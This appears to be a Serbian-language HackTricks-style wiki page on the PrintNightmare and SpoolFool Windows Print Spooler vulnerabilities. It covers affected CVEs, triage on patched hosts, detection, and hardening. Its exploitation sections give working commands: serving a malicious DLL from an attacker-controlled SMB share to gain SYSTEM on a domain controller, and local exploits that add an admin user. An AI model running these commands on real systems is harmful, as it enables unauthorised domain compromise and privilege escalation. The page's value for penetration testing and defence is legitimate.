# PrintNightmare (Windows Print Spooler RCE/LPE)

{{#include ../../banners/hacktricks-training.md}}

> PrintNightmare je zbirni naziv za grupu ranjivosti u Windows servisu **Print Spooler** koje omogućavaju **izvršavanje proizvoljnog koda kao SYSTEM** i, kada je spooler dostupan preko RPC-a, **remote code execution (RCE) na domain controllerima i file serverima**. Najčešće iskorišćavani CVE-ovi su **CVE-2021-1675** (u početku klasifikovan kao LPE) i **CVE-2021-34527** (potpuni RCE). Naknadni problemi kao što su **CVE-2021-34481 („Point & Print“)** i **CVE-2022-21999 („SpoolFool“)** dokazuju da je attack surface i dalje daleko od zatvorenog.

Ako tražite **authentication coercion / relay** preko spoolera, a ne **driver-based RCE/LPE**, pogledajte [ovu drugu stranicu o printer coercion abuse](printers-spooler-service-abuse.md). Ova stranica se fokusira na **učitavanje drivera / DLL-ova kao SYSTEM**.

---

## 1. Ranjive komponente i CVE-ovi

| Year | CVE | Short name | Primitive | Notes |
|------|-----|------------|-----------|-------|
|2021|CVE-2021-1675|„PrintNightmare #1“|LPE|Zakrpano u junskom 2021 CU-u, ali zaobiđeno pomoću CVE-2021-34527|
|2021|CVE-2021-34527|„PrintNightmare“|RCE/LPE|`AddPrinterDriverEx` omogućava authenticated korisnicima da učitaju driver DLL sa remote share-a; nakon avgusta 2021. ovo obično zahteva oslabljene Point & Print policies|
|2021|CVE-2021-34481|„Point & Print“|LPE|Instalacija unsigned drivera od strane non-admin korisnika|
|2022|CVE-2022-21999|„SpoolFool“|LPE|Kreiranje proizvoljnog direktorijuma → DLL planting – funkcioniše nakon patch-eva iz 2021.|

Svi oni zloupotrebljavaju neku od **MS-RPRN / MS-PAR RPC metoda** (`RpcAddPrinterDriver`, `RpcAddPrinterDriverEx`, `RpcAsyncAddPrinterDriver`) ili trust relationships unutar **Point & Print**.

## 2. Exploitation techniques

### 2.1 Kompromitovanje remote Domain Controllera (CVE-2021-34527)

Authenticated, ali **non-privileged** domain user može da pokrene proizvoljne DLL-ove kao **NT AUTHORITY\SYSTEM** na remote spooleru (često DC-u) tako što:
```powershell
# 1. Host malicious driver DLL on a share the victim can reach
impacket-smbserver share ./evil_driver/ -smb2support

# 2. Use a PoC to call RpcAddPrinterDriverEx
python3 CVE-2021-1675.py victim_DC.domain.local  'DOMAIN/user:Password!' \
-f \
'\\attacker_IP\share\evil.dll'
```
Popularni PoC-ovi uključuju **CVE-2021-1675.py** (Python/Impacket), **SharpPrintNightmare.exe** (C#) i module Benjamina Delpyja `misc::printnightmare / lsa::addsid` u **mimikatz**-u.

### 2.2 Lokalna eskalacija privilegija (bilo koji podržani Windows, 2021–2024)

Isti API može se pozvati **lokalno** radi učitavanja driver-a iz `C:\Windows\System32\spool\drivers\x64\3\` i dobijanja SYSTEM privilegija:
```powershell
Import-Module .\Invoke-Nightmare.ps1
Invoke-Nightmare -NewUser hacker -NewPassword P@ssw0rd!
```
### 2.3 Moderna trijaža na zakrpljenim hostovima

Na potpuno ažuriranom hostu, javni PrintNightmare PoC-ovi često ne uspevaju jer Windows sada podrazumevano dozvoljava instalaciju drajvera štampača **samo administratorima** (`RestrictDriverInstallationToAdministrators=1` od 10. avgusta 2021). Pre nego što pokrenete exploit protiv mete, prvo proverite da li je u okruženju ova bezbednosna promena vraćena zbog legacy implementacija štampača:<sup>[[3]](#references)</sup>
```cmd
reg query "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint"
```
Dve najzanimljivije oslabljene vrednosti obično su:<sup>[[3]](#references)</sup>

- `RestrictDriverInstallationToAdministrators = 0`
- `NoWarningNoElevationOnInstall = 1`

Sa Linux-a brzo potvrdite da cilj izlaže relevantne print RPC interfejse pre pokretanja PoC-a:
```bash
rpcdump.py @TARGET | egrep 'MS-RPRN|MS-PAR'
```
Neki noviji javno dostupni alati takođe nude bezbedniji tok rada **check/list** pre slanja DLL-a:
```bash
python3 printnightmare.py -check 'DOMAIN/user:Password@TARGET'
python3 printnightmare.py -list  'DOMAIN/user:Password@TARGET'
```
> Ako dobijete `RPC_E_ACCESS_DENIED` (`0x8001011b`) kao korisnik sa niskim privilegijama, obično vidite podrazumevano ponašanje uvedeno nakon 2021. godine, a ne grešku u transportu.

> Na sistemima Windows 11 22H2+ i novijim klijentskim buildovima, udaljeno štampanje podrazumevano koristi **RPC over TCP**, dok je **RPC over named pipes** (`\PIPE\spoolss`) onemogućen osim ako se izričito ponovo ne omogući. Neki stariji PoC-ovi i beleške iz lab okruženja i dalje pretpostavljaju da je named pipe dostupan.<sup>[[4]](#references)</sup>

### 2.4 Package Point & Print abuse na mrežama sa „zakrpama“

Mnoga enterprise okruženja ostala su **ranjiva zbog policy-ja** nakon originalnih zakrpa iz 2021. godine, jer su helpdesk ili print-server radni tokovi i dalje zahtevali da korisnici koji nisu administratori instaliraju ili ažuriraju drivere. U praksi, offensive playbook postaje sledeći:

- Ako su security prompt-ovi potpuno onemogućeni, **classic arbitrary-DLL PrintNightmare** i dalje predstavlja najkraći put.
- Ako je opcija `Only use Package Point and Print` omogućena, obično je potrebno preći na putanju sa **signed package-aware driver-om**, umesto direktnog ubacivanja DLL-a.<sup>[[3]](#references)</sup>
- Istraživanje iz 2024. godine pokazalo je da **`Package Point and Print - Approved servers` sam po sebi nije čvrsta granica poverenja**: ako attacker može da spoof-uje ili hijack-uje name resolution za jedan odobreni print server, žrtve i dalje mogu biti preusmerene na malicious server koji ispunjava policy provere.<sup>[[4]](#references)</sup>
- Čak i kombinovanje UNC hardening-a sa forsiranim RPC-over-SMB može biti nepouzdano, jer moderni klijenti mogu **preći na RPC over TCP**.<sup>[[4]](#references)</sup>

Zbog toga se moderna eksploatacija u stilu PrintNightmare-a često više zasniva na **abuse-u enterprise printer deployment policy-ja** nego na nepromenjenom ponavljanju originalnog PoC-a iz 2021. godine.

### 2.5 SpoolFool (CVE-2022-21999) – zaobilaženje ispravki iz 2021. godine

Microsoft-ove zakrpe iz 2021. godine blokirale su remote driver loading, ali **nisu ojačale permissions direktorijuma**. SpoolFool zloupotrebljava parametar `SpoolDirectory` kako bi kreirao proizvoljni direktorijum unutar `C:\Windows\System32\spool\drivers\`, ubacio payload DLL i primorao spooler da ga učita:<sup>[[2]](#references)</sup>
```powershell
# Binary version (local exploit)
SpoolFool.exe -dll add_user.dll

# PowerShell wrapper
Import-Module .\SpoolFool.ps1 ; Invoke-SpoolFool -dll add_user.dll
```
> Exploit radi na potpuno ažuriranim sistemima Windows 7 → Windows 11 i Server 2012R2 → 2022 pre februarskih ažuriranja iz 2022. godine<sup>[[2]](#references)</sup>

---

## 3. Detekcija i hunting

* **PrintService logovi** – omogućite kanal *Microsoft-Windows-PrintService/Operational* i pratite **Event ID 316** (dodat ili ažuriran driver, obično uključuje nazive DLL-ova) pri uspešnim i neuspešnim pokušajima. Uparite ga sa **Event ID 808/811** za sumnjive greške pri učitavanju spooler modula/drivera.
* **Sysmon** – `Event ID 7` (učitana slika) ili `11/23` (upis/brisanje fajla) unutar `C:\Windows\System32\spool\drivers\*` kada je nadređeni proces **spoolsv.exe**.
* **Procesna hijerarhija** – generišite upozorenje kad god **spoolsv.exe** pokrene `cmd.exe`, `rundll32.exe`, PowerShell ili bilo koji neočekivani unsigned child process.
* **Mrežna telemetrija** – neočekivani SMB fetch-ovi iz procesa **spoolsv.exe** ka share-ovima pod kontrolom napadača ili neuobičajen printer RPC saobraćaj sa servera koji ne bi trebalo da se ponašaju kao print serveri predstavljaju kvalitetne indikatore za dalju analizu.

## 4. Mitigacija i hardening

1. **Patchujte!** – Primenite najnoviji kumulativni update na svakom Windows hostu na kojem je instaliran Print Spooler service.
2. **Onemogućite spooler tamo gde nije potreban**, naročito na Domain Controllerima:
```powershell
Stop-Service Spooler -Force
Set-Service Spooler -StartupType Disabled
```
3. **Blokirajte udaljene konekcije** uz zadržavanje mogućnosti lokalnog štampanja – Group Policy: `Computer Configuration → Administrative Templates → Printers → Allow Print Spooler to accept client connections = Disabled`.
4. **Ograničite Point & Print samo na administratore** postavljanjem sledećeg:
```cmd
reg add "HKLM\Software\Policies\Microsoft\Windows NT\Printers\PointAndPrint" \
/v RestrictDriverInstallationToAdministrators /t REG_DWORD /d 1 /f
```
Detaljna uputstva nalaze se u Microsoft KB5005652<sup>[[1]](#references)</sup>
5. Ako poslovni zahtevi nalažu `RestrictDriverInstallationToAdministrators=0`, svaku drugu printer policy tretirajte samo kao **delimičnu mitigaciju**. U najmanju ruku, preferirajte **package-aware drivere**, omogućite **Only use Package Point and Print** i ograničite **Package Point and Print - Approved servers** na eksplicitno navedene print servere unutar forest-a.<sup>[[3]](#references)</sup>
6. **Ne vraćajte privatnost printer RPC-a na prethodne vrednosti** samo da biste rešili neispravna mapiranja printera. Okruženja koja postave `RpcAuthnLevelPrivacyEnabled=0` poništavaju hardening uveden zbog **CVE-2021-1678** i obično zahtevaju dodatnu pažnju tokom angažmana.<sup>[[4]](#references)</sup>

---

## 5. Povezana istraživanja / alati

* [`printnightmare` moduli alata mimikatz](https://github.com/gentilkiwi/mimikatz/tree/master/modules)
* [`ly4k/PrintNightmare`](https://github.com/ly4k/PrintNightmare) – standardna Impacket implementacija sa režimima `-check`, `-list` i `-delete`
* [`m8sec/CVE-2021-34527`](https://github.com/m8sec/CVE-2021-34527) – wrapper sa ugrađenom SMB isporukom, podrškom za više targeta i režimima `MS-RPRN` / `MS-PAR`
* SharpPrintNightmare (C#) / Invoke-Nightmare (PowerShell)
* [`Concealed Position`](https://github.com/jacob-baines/concealed_position) – zloupotreba sopstvenog ranjivog printer drivera kroz package Point & Print
* SpoolFool exploit i write-up
* 0patch micropatches za SpoolFool i druge spooler bugove

Ako želite da **iznudite autentifikaciju** putem spoolera umesto učitavanja drivera, pređite na [printer spooler service abuse](printers-spooler-service-abuse.md).

---

## References

- [1] [Microsoft – KB5005652: Manage new Point & Print default driver installation behavior](https://support.microsoft.com/en-us/topic/kb5005652-manage-new-point-and-print-default-driver-installation-behavior-cve-2021-34481-873642bf-2634-49c5-a23b-6d8e9a302872)
- [2] [Oliver Lyak – SpoolFool: CVE-2022-21999](https://github.com/ly4k/SpoolFool)
- [3] [itm4n – A Practical Guide to PrintNightmare in 2024](https://itm4n.github.io/printnightmare-exploitation/)
- [4] [itm4n – The PrintNightmare is not Over Yet](https://itm4n.github.io/printnightmare-not-over/)

{{#include ../../banners/hacktricks-training.md}}
